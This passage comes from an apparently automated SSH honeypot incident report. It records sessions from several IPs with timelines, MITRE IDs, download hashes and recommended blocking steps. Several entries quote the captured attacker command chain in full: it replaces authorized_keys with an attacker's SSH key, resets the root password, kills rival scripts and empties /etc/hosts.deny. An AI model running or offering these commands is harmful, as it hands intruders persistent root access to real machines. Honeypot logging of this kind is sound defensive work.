| `2026-06-15 02:37:45` | `cowrie.command.input` |
| `2026-06-15 02:37:45` | `cowrie.command.failed` |
| `2026-06-15 02:37:46` | `cowrie.log.closed` |
| `2026-06-15 02:37:47` | `cowrie.session.params` |
| `2026-06-15 02:37:47` | `cowrie.command.input` |
| `2026-06-15 02:37:47` | `cowrie.session.file_download` |
| `2026-06-15 02:37:47` | `cowrie.log.closed` |
| `2026-06-15 02:37:58` | `cowrie.session.params` |
| `2026-06-15 02:37:58` | `cowrie.command.input` |
| `2026-06-15 02:37:59` | `cowrie.log.closed` |
| `2026-06-15 02:37:59` | `cowrie.session.params` |
| `2026-06-15 02:37:59` | `cowrie.command.input` |
| `2026-06-15 02:37:59` | `cowrie.log.closed` |
| `2026-06-15 02:38:00` | `cowrie.session.params` |
| `2026-06-15 02:38:00` | `cowrie.command.input` |
| `2026-06-15 02:38:00` | `cowrie.session.file_download` |
| `2026-06-15 02:38:00` | `cowrie.log.closed` |
| `2026-06-15 02:38:01` | `cowrie.session.params` |
| `2026-06-15 02:38:01` | `cowrie.command.input` |
| `2026-06-15 02:38:01` | `cowrie.log.closed` |
| `2026-06-15 02:38:02` | `cowrie.session.params` |
| `2026-06-15 02:38:02` | `cowrie.command.input` |
| `2026-06-15 02:38:02` | `cowrie.log.closed` |
| `2026-06-15 02:38:03` | `cowrie.session.params` |
| `2026-06-15 02:38:03` | `cowrie.command.input` |
| `2026-06-15 02:38:03` | `cowrie.command.input` |
| `2026-06-15 02:38:03` | `cowrie.log.closed` |
| `2026-06-15 02:38:04` | `cowrie.session.params` |
| `2026-06-15 02:38:04` | `cowrie.command.input` |
| `2026-06-15 02:38:04` | `cowrie.log.closed` |
| `2026-06-15 02:38:05` | `cowrie.session.params` |
| `2026-06-15 02:38:05` | `cowrie.command.input` |
| `2026-06-15 02:38:05` | `cowrie.log.closed` |
| `2026-06-15 02:38:06` | `cowrie.session.params` |
| `2026-06-15 02:38:06` | `cowrie.command.input` |
| `2026-06-15 02:38:06` | `cowrie.log.closed` |
| `2026-06-15 02:38:07` | `cowrie.session.params` |
| `2026-06-15 02:38:07` | `cowrie.command.input` |
| `2026-06-15 02:38:08` | `cowrie.log.closed` |
| `2026-06-15 02:38:08` | `cowrie.session.params` |
| `2026-06-15 02:38:08` | `cowrie.command.input` |
| `2026-06-15 02:38:08` | `cowrie.log.closed` |
| `2026-06-15 02:38:09` | `cowrie.session.params` |
| `2026-06-15 02:38:09` | `cowrie.command.input` |
| `2026-06-15 02:38:09` | `cowrie.log.closed` |
| `2026-06-15 02:38:10` | `cowrie.session.params` |
| `2026-06-15 02:38:10` | `cowrie.command.input` |
| `2026-06-15 02:38:10` | `cowrie.log.closed` |
| `2026-06-15 02:38:11` | `cowrie.session.params` |
| `2026-06-15 02:38:11` | `cowrie.command.input` |
| `2026-06-15 02:38:12` | `cowrie.log.closed` |
| `2026-06-15 02:38:12` | `cowrie.session.params` |
| `2026-06-15 02:38:12` | `cowrie.command.input` |
| `2026-06-15 02:38:12` | `cowrie.log.closed` |
| `2026-06-15 02:38:13` | `cowrie.session.params` |
| `2026-06-15 02:38:13` | `cowrie.command.input` |
| `2026-06-15 02:38:13` | `cowrie.log.closed` |
| `2026-06-15 02:38:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.247.218[.]112` to AbuseIPDB if not already reported
- [ ] Block `223.247.218[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7430cd87cfb5

| Field | Detail |
|---|---|
| **Source IP** | `142.93.48[.]137` |
| **First Seen** | 2026-06-15 02:40 |
| **Last Seen** | 2026-06-15 02:41 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:de2KfuHU6MiH"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 02:40:51` | `cowrie.session.connect` |
| `2026-06-15 02:40:51` | `cowrie.client.version` |
| `2026-06-15 02:40:51` | `cowrie.client.kex` |
| `2026-06-15 02:40:52` | `cowrie.login.success` |
| `2026-06-15 02:40:52` | `cowrie.session.params` |
| `2026-06-15 02:40:52` | `cowrie.command.input` |
| `2026-06-15 02:40:52` | `cowrie.command.failed` |
| `2026-06-15 02:40:53` | `cowrie.log.closed` |
| `2026-06-15 02:40:53` | `cowrie.session.params` |
| `2026-06-15 02:40:53` | `cowrie.command.input` |
| `2026-06-15 02:40:53` | `cowrie.session.file_download` |
| `2026-06-15 02:40:53` | `cowrie.log.closed` |
| `2026-06-15 02:41:04` | `cowrie.session.params` |
| `2026-06-15 02:41:04` | `cowrie.command.input` |
| `2026-06-15 02:41:04` | `cowrie.log.closed` |
| `2026-06-15 02:41:05` | `cowrie.session.params` |
| `2026-06-15 02:41:05` | `cowrie.command.input` |
| `2026-06-15 02:41:05` | `cowrie.log.closed` |
| `2026-06-15 02:41:05` | `cowrie.session.params` |
| `2026-06-15 02:41:05` | `cowrie.command.input` |
| `2026-06-15 02:41:05` | `cowrie.session.file_download` |
| `2026-06-15 02:41:05` | `cowrie.log.closed` |
| `2026-06-15 02:41:06` | `cowrie.session.params` |
| `2026-06-15 02:41:06` | `cowrie.command.input` |
| `2026-06-15 02:41:06` | `cowrie.log.closed` |
| `2026-06-15 02:41:07` | `cowrie.session.params` |
| `2026-06-15 02:41:07` | `cowrie.command.input` |
| `2026-06-15 02:41:07` | `cowrie.log.closed` |
| `2026-06-15 02:41:07` | `cowrie.session.params` |
| `2026-06-15 02:41:07` | `cowrie.command.input` |
| `2026-06-15 02:41:07` | `cowrie.command.input` |
| `2026-06-15 02:41:08` | `cowrie.log.closed` |
| `2026-06-15 02:41:08` | `cowrie.session.params` |
| `2026-06-15 02:41:08` | `cowrie.command.input` |
| `2026-06-15 02:41:08` | `cowrie.log.closed` |
| `2026-06-15 02:41:09` | `cowrie.session.params` |
| `2026-06-15 02:41:09` | `cowrie.command.input` |
| `2026-06-15 02:41:09` | `cowrie.log.closed` |
| `2026-06-15 02:41:09` | `cowrie.session.params` |
| `2026-06-15 02:41:09` | `cowrie.command.input` |
| `2026-06-15 02:41:10` | `cowrie.log.closed` |
| `2026-06-15 02:41:10` | `cowrie.session.params` |
| `2026-06-15 02:41:10` | `cowrie.command.input` |
| `2026-06-15 02:41:10` | `cowrie.log.closed` |
| `2026-06-15 02:41:11` | `cowrie.session.params` |
| `2026-06-15 02:41:11` | `cowrie.command.input` |
| `2026-06-15 02:41:11` | `cowrie.log.closed` |
| `2026-06-15 02:41:11` | `cowrie.session.params` |
| `2026-06-15 02:41:11` | `cowrie.command.input` |
| `2026-06-15 02:41:12` | `cowrie.log.closed` |
| `2026-06-15 02:41:12` | `cowrie.session.params` |
| `2026-06-15 02:41:12` | `cowrie.command.input` |
| `2026-06-15 02:41:12` | `cowrie.log.closed` |
| `2026-06-15 02:41:13` | `cowrie.session.params` |
| `2026-06-15 02:41:13` | `cowrie.command.input` |
| `2026-06-15 02:41:13` | `cowrie.log.closed` |
| `2026-06-15 02:41:13` | `cowrie.session.params` |
| `2026-06-15 02:41:13` | `cowrie.command.input` |
| `2026-06-15 02:41:14` | `cowrie.log.closed` |
| `2026-06-15 02:41:14` | `cowrie.session.params` |
| `2026-06-15 02:41:14` | `cowrie.command.input` |
| `2026-06-15 02:41:14` | `cowrie.log.closed` |
| `2026-06-15 02:41:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `142.93.48[.]137` to AbuseIPDB if not already reported
- [ ] Block `142.93.48[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca743cb22712

| Field | Detail |
|---|---|
| **Source IP** | `223.247.218[.]112` |
| **First Seen** | 2026-06-15 02:49 |
| **Last Seen** | 2026-06-15 02:50 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:xZITMVzpGr0A"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 02:49:38` | `cowrie.session.connect` |
| `2026-06-15 02:49:39` | `cowrie.client.version` |
| `2026-06-15 02:49:41` | `cowrie.client.kex` |
| `2026-06-15 02:49:42` | `cowrie.login.success` |
| `2026-06-15 02:49:42` | `cowrie.session.params` |
| `2026-06-15 02:49:42` | `cowrie.command.input` |
| `2026-06-15 02:49:42` | `cowrie.command.failed` |
| `2026-06-15 02:49:43` | `cowrie.log.closed` |
| `2026-06-15 02:49:43` | `cowrie.session.params` |
| `2026-06-15 02:49:43` | `cowrie.command.input` |
| `2026-06-15 02:49:43` | `cowrie.session.file_download` |
| `2026-06-15 02:49:43` | `cowrie.log.closed` |
| `2026-06-15 02:49:56` | `cowrie.session.params` |
| `2026-06-15 02:49:56` | `cowrie.command.input` |
| `2026-06-15 02:49:56` | `cowrie.log.closed` |
| `2026-06-15 02:49:57` | `cowrie.session.params` |
| `2026-06-15 02:49:57` | `cowrie.command.input` |
| `2026-06-15 02:49:57` | `cowrie.log.closed` |
| `2026-06-15 02:49:58` | `cowrie.session.params` |
| `2026-06-15 02:49:58` | `cowrie.command.input` |
| `2026-06-15 02:49:58` | `cowrie.session.file_download` |
| `2026-06-15 02:49:58` | `cowrie.log.closed` |
| `2026-06-15 02:49:59` | `cowrie.session.params` |
| `2026-06-15 02:49:59` | `cowrie.command.input` |
| `2026-06-15 02:50:00` | `cowrie.log.closed` |
| `2026-06-15 02:50:00` | `cowrie.session.params` |
| `2026-06-15 02:50:00` | `cowrie.command.input` |
| `2026-06-15 02:50:00` | `cowrie.log.closed` |
| `2026-06-15 02:50:01` | `cowrie.session.params` |
| `2026-06-15 02:50:01` | `cowrie.command.input` |
| `2026-06-15 02:50:01` | `cowrie.command.input` |
| `2026-06-15 02:50:01` | `cowrie.log.closed` |
| `2026-06-15 02:50:02` | `cowrie.session.params` |
| `2026-06-15 02:50:02` | `cowrie.command.input` |
| `2026-06-15 02:50:02` | `cowrie.log.closed` |
| `2026-06-15 02:50:03` | `cowrie.session.params` |
| `2026-06-15 02:50:03` | `cowrie.command.input` |
| `2026-06-15 02:50:03` | `cowrie.log.closed` |
| `2026-06-15 02:50:04` | `cowrie.session.params` |
| `2026-06-15 02:50:04` | `cowrie.command.input` |
| `2026-06-15 02:50:04` | `cowrie.log.closed` |
| `2026-06-15 02:50:05` | `cowrie.session.params` |
| `2026-06-15 02:50:05` | `cowrie.command.input` |
| `2026-06-15 02:50:05` | `cowrie.log.closed` |
| `2026-06-15 02:50:05` | `cowrie.session.params` |
| `2026-06-15 02:50:05` | `cowrie.command.input` |
| `2026-06-15 02:50:06` | `cowrie.log.closed` |
| `2026-06-15 02:50:06` | `cowrie.session.params` |
| `2026-06-15 02:50:06` | `cowrie.command.input` |
| `2026-06-15 02:50:07` | `cowrie.log.closed` |
| `2026-06-15 02:50:07` | `cowrie.session.params` |
| `2026-06-15 02:50:07` | `cowrie.command.input` |
| `2026-06-15 02:50:08` | `cowrie.log.closed` |
| `2026-06-15 02:50:08` | `cowrie.session.params` |
| `2026-06-15 02:50:08` | `cowrie.command.input` |
| `2026-06-15 02:50:09` | `cowrie.log.closed` |
| `2026-06-15 02:50:10` | `cowrie.session.params` |
| `2026-06-15 02:50:10` | `cowrie.command.input` |
| `2026-06-15 02:50:10` | `cowrie.log.closed` |
| `2026-06-15 02:50:11` | `cowrie.session.params` |
| `2026-06-15 02:50:11` | `cowrie.command.input` |
| `2026-06-15 02:50:11` | `cowrie.log.closed` |
| `2026-06-15 02:50:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.247.218[.]112` to AbuseIPDB if not already reported
- [ ] Block `223.247.218[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-651715774fca

| Field | Detail |
|---|---|
| **Source IP** | `142.93.48[.]137` |
| **First Seen** | 2026-06-15 02:57 |
| **Last Seen** | 2026-06-15 02:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 02:57:08` | `cowrie.session.connect` |
| `2026-06-15 02:57:08` | `cowrie.client.version` |
| `2026-06-15 02:57:08` | `cowrie.client.kex` |
| `2026-06-15 02:57:09` | `cowrie.login.success` |
| `2026-06-15 02:57:10` | `cowrie.session.params` |
| `2026-06-15 02:57:10` | `cowrie.command.input` |
| `2026-06-15 02:57:10` | `cowrie.command.failed` |
| `2026-06-15 02:57:10` | `cowrie.log.closed` |
| `2026-06-15 02:57:10` | `cowrie.session.params` |
| `2026-06-15 02:57:10` | `cowrie.command.input` |
| `2026-06-15 02:57:11` | `cowrie.session.file_download` |
| `2026-06-15 02:57:11` | `cowrie.log.closed` |
| `2026-06-15 02:57:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `142.93.48[.]137` to AbuseIPDB if not already reported
- [ ] Block `142.93.48[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf8390c36daf

| Field | Detail |
|---|---|
| **Source IP** | `142.93.48[.]137` |
| **First Seen** | 2026-06-15 02:57 |
| **Last Seen** | 2026-06-15 02:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 02:57:13` | `cowrie.session.connect` |
| `2026-06-15 02:57:13` | `cowrie.client.version` |
| `2026-06-15 02:57:13` | `cowrie.client.kex` |
| `2026-06-15 02:57:14` | `cowrie.login.success` |
| `2026-06-15 02:57:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `142.93.48[.]137` to AbuseIPDB if not already reported
- [ ] Block `142.93.48[.]137` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a460309e96f

| Field | Detail |
|---|---|
| **Source IP** | `223.247.218[.]112` |
| **First Seen** | 2026-06-15 03:35 |
| **Last Seen** | 2026-06-15 03:35 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 03:35:04` | `cowrie.session.connect` |
| `2026-06-15 03:35:04` | `cowrie.client.version` |
| `2026-06-15 03:35:05` | `cowrie.client.kex` |
| `2026-06-15 03:35:06` | `cowrie.login.success` |
| `2026-06-15 03:35:06` | `cowrie.session.params` |
| `2026-06-15 03:35:06` | `cowrie.command.input` |
| `2026-06-15 03:35:06` | `cowrie.command.failed` |
| `2026-06-15 03:35:06` | `cowrie.log.closed` |
| `2026-06-15 03:35:07` | `cowrie.session.params` |
| `2026-06-15 03:35:07` | `cowrie.command.input` |
| `2026-06-15 03:35:07` | `cowrie.session.file_download` |
| `2026-06-15 03:35:07` | `cowrie.log.closed` |
| `2026-06-15 03:35:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.247.218[.]112` to AbuseIPDB if not already reported
- [ ] Block `223.247.218[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-901743d72f2c

| Field | Detail |
|---|---|
| **Source IP** | `223.247.218[.]112` |
| **First Seen** | 2026-06-15 03:35 |
| **Last Seen** | 2026-06-15 03:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 03:35:16` | `cowrie.session.connect` |
| `2026-06-15 03:35:16` | `cowrie.client.version` |
| `2026-06-15 03:35:16` | `cowrie.client.kex` |
| `2026-06-15 03:35:17` | `cowrie.login.success` |
| `2026-06-15 03:35:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.247.218[.]112` to AbuseIPDB if not already reported
- [ ] Block `223.247.218[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3185699c85f3

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 03:41 |
| **Last Seen** | 2026-06-15 03:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 03:41:26` | `cowrie.session.connect` |
| `2026-06-15 03:41:26` | `cowrie.client.version` |
| `2026-06-15 03:41:26` | `cowrie.client.kex` |
| `2026-06-15 03:41:26` | `cowrie.login.success` |
| `2026-06-15 03:41:27` | `cowrie.session.params` |
| `2026-06-15 03:41:27` | `cowrie.command.input` |
| `2026-06-15 03:41:27` | `cowrie.command.failed` |
| `2026-06-15 03:41:27` | `cowrie.log.closed` |
| `2026-06-15 03:41:27` | `cowrie.session.params` |
| `2026-06-15 03:41:27` | `cowrie.command.input` |
| `2026-06-15 03:41:28` | `cowrie.session.file_download` |
| `2026-06-15 03:41:28` | `cowrie.log.closed` |
| `2026-06-15 03:41:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f752051058d

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 03:41 |
| **Last Seen** | 2026-06-15 03:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 03:41:30` | `cowrie.session.connect` |
| `2026-06-15 03:41:30` | `cowrie.client.version` |
| `2026-06-15 03:41:30` | `cowrie.client.kex` |
| `2026-06-15 03:41:31` | `cowrie.login.success` |
| `2026-06-15 03:41:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa3175e14479

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 03:45 |
| **Last Seen** | 2026-06-15 03:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 03:45:33` | `cowrie.session.connect` |
| `2026-06-15 03:45:33` | `cowrie.client.version` |
| `2026-06-15 03:45:33` | `cowrie.client.kex` |
| `2026-06-15 03:45:34` | `cowrie.login.success` |
| `2026-06-15 03:45:34` | `cowrie.session.params` |
| `2026-06-15 03:45:34` | `cowrie.command.input` |
| `2026-06-15 03:45:34` | `cowrie.command.failed` |
| `2026-06-15 03:45:35` | `cowrie.log.closed` |
| `2026-06-15 03:45:35` | `cowrie.session.params` |
| `2026-06-15 03:45:35` | `cowrie.command.input` |
| `2026-06-15 03:45:35` | `cowrie.session.file_download` |
| `2026-06-15 03:45:35` | `cowrie.log.closed` |
| `2026-06-15 03:45:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edeb5e6cc0b3

| Field | Detail |
|---|---|
| **Source IP** | `117.102.86[.]226` |
| **First Seen** | 2026-06-15 03:45 |
| **Last Seen** | 2026-06-15 03:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-15 03:45:37` | `cowrie.session.connect` |
| `2026-06-15 03:45:37` | `cowrie.client.version` |
| `2026-06-15 03:45:38` | `cowrie.client.kex` |
| `2026-06-15 03:45:38` | `cowrie.login.success` |
| `2026-06-15 03:45:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.102.86[.]226` to AbuseIPDB if not already reported
- [ ] Block `117.102.86[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8a245389161

| Field | Detail |
|---|---|
| **Source IP** | `41.90.100[.]147` |
| **First Seen** | 2026-06-15 03:45 |
| **Last Seen** | 2026-06-15 03:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
